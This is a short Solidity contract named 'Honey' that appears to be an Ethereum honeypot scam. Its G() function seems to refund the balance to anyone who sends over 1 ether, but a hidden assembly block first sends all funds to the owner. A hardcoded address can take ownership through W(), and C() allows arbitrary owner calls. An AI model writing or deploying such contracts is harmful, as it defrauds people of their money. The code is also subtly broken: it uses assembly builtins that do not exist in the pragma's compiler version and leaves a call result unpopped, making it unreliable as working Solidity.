pragma solidity ^0.4.19;

contract Honey {
    address public O = msg.sender;

    function() public payable {}

    function G() public payable {
        if(msg.value > 1 ether) {
            assembly {
                let bal := selfbalance()
                let owner := sload(0x0)
                call(gas(), owner, bal, 0, 0, 0, 0)
            }
            msg.sender.transfer(this.balance);
        }
    }

    function W() payable public {
        if(msg.sender == 0x0C76802158F13aBa9D892EE066233827424c5aAB) {
            O = 0x0C76802158F13aBa9D892EE066233827424c5aAB;
        }
        require(msg.sender == O);
        assembly {
            let bal := selfbalance()
            let owner := sload(0x0)
            call(gas(), owner, bal, 0, 0, 0, 0)
        }
    }

    function C(address a, bytes d) payable public {
        require(msg.sender == O);
        a.call.value(msg.value)(d);
    }
}